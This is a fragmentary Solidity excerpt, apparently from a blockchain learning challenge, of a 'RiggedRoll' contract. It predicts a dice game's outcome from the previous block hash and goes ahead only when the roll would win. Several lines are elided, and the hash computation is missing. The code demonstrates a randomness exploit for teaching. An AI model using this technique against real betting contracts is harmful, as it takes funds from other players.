...
contract RiggedRoll is Ownable {
  ...
  function riggedRoll() public payable {
      require(address(this).balance >= 0.002 ether, "Balance failed to be enough value");
      bytes32 prevHash = blockhash(block.number - 1);
      // console.log('blockhash number-1: ');
      ...
      // console.log(diceGame.nonce());
      uint256 roll = uint256(hash) % 16;
      // console.logString("RiggedRoll Events: ");
      // console.logString('Hash: ');
      // console.logBytes32(hash);
      console.log("THE RiGGED ROLL IS ",roll);
      require(roll <=2, "RIG FAILED ROLL > 2");
